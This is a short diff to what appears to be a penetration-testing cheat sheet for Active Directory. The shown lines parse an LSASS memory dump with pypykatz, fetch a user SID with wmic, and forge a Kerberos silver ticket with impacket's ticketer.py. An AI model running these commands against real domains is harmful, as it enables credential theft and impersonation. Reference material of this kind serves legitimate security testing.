@@ -276,7 +276,12 @@ SNMP = Off
 pypykatz lsa minidump lsass.DMP
 ```
 
-## impacket golden and silver tickets
+## golden and silver tickets
+### Get user SID value by using the Windows Terminal
+```cmd
+wmic useraccount where name="USER" get sid
+```
+
 #### Silver ticket
 ```bash
 python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain>l <user>
